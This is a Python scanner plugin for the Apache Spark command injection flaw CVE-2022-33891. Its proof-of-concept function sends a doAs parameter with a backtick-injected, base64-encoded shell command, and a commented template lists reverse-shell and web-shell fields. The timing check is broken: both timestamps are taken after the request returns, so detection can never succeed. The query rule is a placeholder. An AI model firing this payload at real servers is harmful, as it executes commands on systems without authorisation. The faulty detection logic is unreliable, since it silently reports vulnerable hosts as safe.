# -*- coding: UTF-8 -*-
#!/usr/bin/python
import base64
import datetime
import subprocess

import requests
def vuln_info():
    info={
        'vuln_name': 'Spark远程命令执行漏洞(CVE-2022-33891)',  #漏洞名称
        'vuln_referer':'未知',  #漏洞来源
        'vuln_author':'qianxiao996',  #插件作者
        'cms_name':'Apache',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''
            Apache Spark 是美国阿帕奇（Apache）软件基金会的一款支持非循环数据流和内存计算的大规模数据处理引擎。如果 Apache Spark UI 启用了 ACL，则 HttpSecurityFilter 中的代码路径允许通过提供任意用户名来模拟执行。恶意用户能够访问权限检查功能，根据他们的输入构建一个 Unix shell 命令并执行。攻击者可利用此漏洞任意执行 shell 命令。
        ''',
        'vuln_identifier':'''CVE-2022-33891''',
        'vuln_class':'远程命令执行',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''更新版本''',
        'FofaQuery_type':'socket', #socket、http
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="百度"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':0  #是否有exp   1为有 0为无
    }
    return info
# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    # 返回参数
    #Result返回是否存在，
    #Result_Info为返回的信息，可以为Paylaod
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
    result = {"Result":False,"Result_Info":""}
    url = f'{url}/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash`'
    try:
        res = requests.post(url=url, verify=False, timeout=20, allow_redirects=False)
        t1 = datetime.datetime.now()
        t2 = datetime.datetime.now()
        delta = t2 - t1
        if delta.seconds < 10:
            pass
        else:
            result['Result'] =True
            result['Result_Info']="存在漏洞:"+url
    except Exception as e:
        result['Debug_Info']= str(e)

    return result
    # {
    #     "type":"cmd",  #cmd,shell,uploadfile
    #     "command":"whoami",  #cmd命令
    #     "reverse_ip":"127.0.0.1", #反弹shell的ip
    #     "reverse_port":"8888", #反弹shell的端口
    #     "filename":"conf.php", #写入文件的名字
    #     "filename_contents":"shell内容", #shell文件内容
    # }
# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    result = {"Result":False,"Result_Info":"该漏洞不存在EXP"}
    return result



